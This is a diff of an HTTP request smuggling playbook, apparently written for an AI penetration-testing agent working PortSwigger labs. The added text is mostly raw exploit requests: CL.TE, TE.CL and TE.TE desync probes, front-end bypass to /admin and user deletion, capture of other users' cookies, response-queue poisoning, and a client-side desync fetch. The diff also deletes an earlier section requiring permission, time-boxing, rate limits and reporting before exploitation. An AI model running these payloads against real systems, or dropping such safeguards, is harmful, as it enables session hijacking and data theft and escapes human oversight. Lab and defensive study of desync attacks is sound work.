@@ -1,133 +1,219 @@
-# HTTP Request Smuggling (HRS) / Desync
+# HTTP Request Smuggling / Desync Methodology
+## Expert-Level Playbook (CL.TE / TE.CL / TE.TE / H2 / CL.0 / desync)
 
-> One of the highest-impact bug classes — bypass auth, poison caches,
-> hijack sessions of next users in the queue. Hard to detect; easy to
-> wreck production with — TIME-BOX testing and prefer time-based detection
-> over content-based.
-
----
-
-## Phase 1: Theory
-
-When a frontend (CDN/LB) and backend disagree on where one request ends
-and the next begins, you can append bytes that the backend treats as a
-fresh request.
-
-Disagreements stem from `Transfer-Encoding` vs. `Content-Length` parsing.
-
-| Type | Frontend uses | Backend uses |
-|------|---------------|--------------|
-| CL.TE | Content-Length | Transfer-Encoding |
-| TE.CL | Transfer-Encoding | Content-Length |
-| TE.TE | TE (different obfuscation) | TE (different obfuscation) |
-| H2.CL / H2.TE | HTTP/2 | downgraded HTTP/1.1 reads CL/TE |
+> Highest-volume PortSwigger class (22 practitioner/expert labs). Smuggling
+> almost never reproduces through a normalizing HTTP client — always drive the
+> core proof with `request_smuggling_probe`, `burp_send_http1_request`, Caido
+> raw send, or a raw socket. Browsers are only for observing victim impact.
 
 ---
 
-## Phase 2: Detection (TIME-BASED — safe-ish)
+## Phase 1: Recon & Desync Surface Mapping
 
-### 2.1 CL.TE detection probe
-A delay on the second request indicates desync:
-```http
+### 1.1 Preconditions
+- A front-end (CDN/LB/reverse proxy) forwards to a back-end over HTTP/1.1 with
+  connection reuse. Smuggling exploits front-end vs back-end disagreement on
+  where one request ends and the next begins.
+- Confirm HTTP/1.1 keep-alive is available. If the front-end speaks HTTP/2 to
+  the client, target HTTP/2 desync / downgrade (H2.CL, H2.TE, H2.0).
+
+### 1.2 Tools
+```
+# Deterministic probe (preferred first move)
+request_smuggling_probe url=https://TARGET/ vector=cl_te_timeout
+
+# Raw HTTP/1.1 with exact bytes (bypasses client normalization)
+burp_send_http1_request  # keeps your Content-Length / Transfer-Encoding verbatim
+caido_local_api operation=send_raw args={raw_request, hostname}
+run_shell  # printf raw bytes | openssl s_client -quiet -connect host:443
+```
+
+### 1.3 Timing-based detection (safe, non-destructive first)
+Send a request whose smuggled portion makes the back-end wait for bytes that
+never arrive → the socket hangs ~ the back-end read timeout.
+```
+# CL.TE timeout probe: front-end uses Content-Length, back-end uses TE
 POST / HTTP/1.1
-Host: target
-Transfer-Encoding: chunked
+Host: TARGET
 Content-Length: 4
+Transfer-Encoding: chunked
 
 1
 A
 X
 ```
-Frontend (CL=4): forwards "1\r\nA\r\nX". Backend (TE): reads "1\r\nA\r\n",
-waits for next chunk → timeout. Anomalous timing on the SECOND request
-in the connection = signal.
-
-### 2.2 TE.CL detection probe
-```http
+```
+# TE.CL timeout probe: front-end uses TE, back-end uses Content-Length
 POST / HTTP/1.1
-Host: target
-Transfer-Encoding: chunked
+Host: TARGET
 Content-Length: 6
+Transfer-Encoding: chunked
 
 0
 
 X
 ```
-Frontend (TE): forwards everything to "0\r\n\r\n". Backend (CL=6): reads
-"0\r\n\r\nX" — leftover "X" gets prepended to next request. Symptom:
-404 / different response on the next pipelined request.
-
-### 2.3 HTTP/2 downgrade
-If the frontend speaks H2 and downgrades to H1 to the backend:
-- Smuggle via H2 pseudo-header injection
-- `:path` containing `\r\n` and a smuggled request
-- This is the modern variant — most SHI bugs in 2022+ are H2-related
+A large latency delta vs a control request confirms the disagreement. Prefer
+`request_smuggling_probe` vectors (`cl_te_timeout`, `te_cl_timeout`) so timing
+and status deltas are captured structurally.
 
 ---
 
-## Phase 3: Tooling
+## Phase 2: Confirming the Vector (differential responses)
 
-### 3.1 burp / smuggler.py / h2cSmuggler
-Inside Kali container:
-```bash
-# Defrag's smuggler.py
-python3 /opt/smuggler/smuggler.py -u https://target
+Timing is noisy; confirm with a differential where the smuggled prefix poisons
+the *next* request on the connection (send probe, then a normal follow-up).
 
-# h2cSmuggler for H2C upgrade smuggling
-h2cSmuggler -x https://target/ -p ./payload.txt
+### 2.1 CL.TE (front-end CL, back-end TE)
+```
+POST / HTTP/1.1
+Host: TARGET
+Content-Length: 6
+Transfer-Encoding: chunked
 
-# h2 downgrade
-http2smugl detect target
+0
+
+G
+```
+The back-end sees the `0\r\n\r\n` terminator; `G` is left buffered and prepended
+to the next request → the victim/follow-up gets a `GPOST ...` 405/404.
+
+### 2.2 TE.CL (front-end TE, back-end CL)
+```
+POST / HTTP/1.1
+Host: TARGET
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+
+```
+Get the chunk sizes exact (hex length lines). `request_smuggling_probe
+vector=te_cl_404` sends the canonical differential.
+
+### 2.3 TE.TE (obfuscated Transfer-Encoding)
+Both ends support TE but one is tricked into ignoring it. Rotate obfuscations:
+```
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked        (space before colon)
+Transfer-Encoding:\tchunked
+Transfer-Encoding: chunked\r\n         (dup header, one obfuscated)
+X: X\nTransfer-Encoding: chunked
+Transfer-Encoding
+ : chunked                              (line folding)
 ```
 
-### 3.2 Manual probe via raw curl
-```bash
-printf 'POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n1\r\nA\r\nX\r\n\r\n' \
-  | timeout 10 openssl s_client -connect target:443 -ign_eof -quiet
+### 2.4 HTTP/2 desync (downgrade)
+When the front-end downgrades H2→H1 to the back-end:
+- **H2.CL** — inject a `content-length` in the H2 request; back-end trusts it.
+- **H2.TE** — inject `transfer-encoding: chunked` via an H2 header.
+- **H2.0 / CL.0** — back-end ignores the body entirely (treats `Content-Length`
+  as 0), so the body is parsed as a new request. Use `burp_send_http1_request`
+  or Burp's HTTP/2 tooling; raw H2 is required (browsers/curl normalize).
+- **Request-line / header injection via H2 pseudo-headers**: smuggle `\r\n` in a
+  header name/value to inject a whole request line after downgrade.
+
+---
+
+## Phase 3: Exploitation Patterns (per PortSwigger sub-variant)
+
+| Sub-variant | Goal | Approach |
+|-------------|------|----------|
+| Confirming CL.TE / TE.CL | detection | differential 404/405 on follow-up |
+| Bypass front-end security controls | reach `/admin` | smuggle a request the front-end would block |
+| Reveal front-end request rewriting | leak added headers | smuggle a request that reflects the body (search) to see injected `X-*` |
+| Capture other users' requests | steal cookies | smuggle a POST to a comment/store endpoint that captures the following victim request |
+| Response queue poisoning | full desync | CL.0 / H2 to desync the response queue and serve admin responses to attackers |
+| Web cache poisoning via smuggling | persistent XSS | smuggle to poison a cached response |
+| Client-side desync (CSD) | browser-driven | back-end ignores body (CL.0); a JS `fetch` keep-alive smuggles into the victim's own connection |
+
+### 3.1 Bypass front-end access control
 ```
-Watch for the second response (or absence of one) — timing is the tell.
+POST / HTTP/1.1
+Host: TARGET
+Content-Length: <n>
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: TARGET
+X-Ignore: X
+```
+Then a normal follow-up returns the admin page. To delete the user, smuggle the
+exact `GET /admin/delete?username=carlos` the lab requires.
+
+### 3.2 Reveal front-end rewriting (find the header name)
+Smuggle a POST to a search endpoint with a large `Content-Length` so the next
+victim request body is reflected, revealing the internal header the front-end
+adds (e.g. `X-SSL-CLIENT-CN`, `X-Forwarded-For`). Then reuse that header.
+
+### 3.3 Capture another user's request
+Smuggle a POST to a form that stores+reflects input (comment) with a
+`Content-Length` long enough to swallow the victim's subsequent request line +
+headers + cookies; read the stored comment to recover the victim `session`.
+
+### 3.4 Response-queue poisoning / CL.0
+```
+# CL.0: back-end ignores Content-Length on this endpoint (e.g. static/GET)
+POST /resources/... HTTP/1.1
+Host: TARGET
+Content-Length: <n>
+Connection: keep-alive
+
+GET /admin HTTP/1.1
+Host: TARGET
+
+```
+Every subsequent response on the pooled connection is shifted by one → you
+receive the admin response intended for the next client. Repeat to steal.
+
+### 3.5 Client-side desync (CSD)
+Prove the back-end ignores the body on a specific path, then host a page that
+uses `fetch(url,{method:'POST',body:'GET /... ',mode:'no-cors'})` to desync the
+victim's *own* browser connection — deliver via the exploit server.
 
 ---
 
-## Phase 4: Exploitation Patterns (after desync confirmed)
+## Phase 4: Tooling & Automation
 
-### 4.1 Auth header smuggling
-Smuggle the next user's request and capture their `Authorization` /
-`Cookie` from the proxy by responding with a controlled prefix.
+```
+# Structured vector sweep
+request_smuggling_probe url=https://TARGET/ vector=cl_te_404
+request_smuggling_probe url=https://TARGET/ vector=te_cl_404
+request_smuggling_probe url=https://TARGET/ vector=cl_te_timeout
 
-### 4.2 Cache poisoning via desync
-Smuggle a request that responds with an attacker-controlled body for a
-cache-key the next user will fetch.
+# Exact-byte raw send (keep CL/TE untouched)
+burp_send_http1_request   # or caido_local_api send_raw
+burp_send_to_intruder     # concurrency / offset brute for chunk sizes
 
-### 4.3 Internal endpoint access
-Smuggle requests that hit `/admin` while the frontend gates on URL —
-backend may not see the URL the frontend gated on.
-
-### 4.4 Web socket / SSE hijack
-Smuggle into long-lived connections to poison subsequent messages.
-
----
-
-## Phase 5: SAFETY ON CLIENT INFRA
-
-- **Always** time-box. A desync experiment that succeeds can hijack the
-  next legitimate user — only run with explicit permission and outside
-  business hours.
-- Use detection-only payloads first. Don't escalate to exploitation
-  without surfacing the finding to the customer first.
-- The ScopeGuard's rate limiter MUST be active for this methodology
-  (if implemented). Don't run unbounded detection against shared infra.
-- A confirmed desync but no exploited PoC is STILL a critical finding.
-  Report it without exploitation if you can't do so safely.
+# Raw socket fallback (last resort)
+run_shell command="printf 'POST / HTTP/1.1\r\nHost: TARGET\r\n...' | openssl s_client -quiet -connect TARGET:443"
+```
+- Turn OFF automatic `Content-Length`/`Connection` normalization in whatever
+  sender you use. Always set `Connection: keep-alive`.
+- Send the smuggling request twice (prime + trigger) on the same connection.
 
 ---
 
-## Verification
+## Common Failure Modes & Solutions
 
-Validator protocol for HRS:
-1. Replay the timing probe — is the anomaly reproducible?
-2. Counter-probe: the same request WITHOUT the chunked/CL conflict
-   should NOT show the timing anomaly. If it does, the anomaly is
-   environmental (loaded backend, network jitter), not desync.
-3. Run a fresh probe via a different connection — confirms the
-   smuggling is per-request, not connection-state-dependent.
+| Problem | Solution |
+|---------|----------|
+| Client rewrites CL/TE | Use `burp_send_http1_request` / raw socket, never curl/requests |
+| No effect on follow-up | Send both requests down one keep-alive connection; retry to catch queue |
+| Chunk parse errors | Recompute hex chunk-size lines; ensure trailing `\r\n\r\n` |
+| HTTP/2-only front-end | Switch to H2.CL/H2.TE/H2.0 downgrade vectors |
+| Intermittent success | It's a race against real traffic — repeat, use single-connection tooling |
+| Front-end blocks TE | Rotate TE.TE obfuscations (space-before-colon, tab, dup, fold) |
+
+## Validation / Success Criteria
+- [ ] A control request is stable while the crafted probe causes timeout or a
+      queued/`GPOST`-style differential response.
+- [ ] The smuggled request reaches the intended endpoint (`/admin`, delete user,
+      captured cookie, poisoned cache) — not just a timing anomaly.
+- [ ] Exact `Content-Length` / `Transfer-Encoding` bytes preserved in the PoC.
+- [ ] Lab solved banner or required victim impact observed.
